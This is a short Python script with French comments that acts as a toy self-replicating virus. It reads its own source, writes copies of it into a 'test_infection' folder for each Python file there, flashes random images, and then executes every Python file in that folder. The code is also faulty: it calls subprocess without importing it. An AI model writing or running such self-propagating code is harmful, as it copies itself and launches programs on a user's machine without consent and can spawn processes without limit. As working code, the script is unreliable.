import os
import cv2
import time
import random

# ouvrir le fichier source
with open('infestation.py', 'r') as f:
    source_code = f.read()

# spécifiez le chemin d'accès au dossier pour écrire les fichiers
folder_path = "test_infection/"

# fonction pour afficher une image aléatoire pendant 1 seconde
def show_random_image():
    # spécifiez le chemin d'accès au dossier contenant les images
    images_folder_path = "I_AM_HERE/"
    # listez tous les fichiers dans le dossier
    images = os.listdir(images_folder_path)
    # choisissez un fichier aléatoire
    random_image = random.choice(images)
    # chargez l'image à l'aide de OpenCV
    img = cv2.imread(os.path.join(images_folder_path, random_image))
    # affichez l'image pendant 1 seconde
    cv2.imshow("Random Image", img)
    cv2.waitKey(1000)
    cv2.destroyAllWindows()

# parcourir tous les fichiers du dossier
for i, filename in enumerate(os.listdir(folder_path)):
    # vérifiez que le fichier est un fichier Python
    if filename.endswith(".py"):
        # ouvrir le fichier et écrire le code source
        with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
            f.write(source_code)
            # afficher une image aléatoire
            show_random_image()

# exécuter chaque fichier créé
for i, filename in enumerate(os.listdir(folder_path)):
    if filename.endswith(".py"):
        subprocess.run(["python", os.path.join(folder_path, filename)])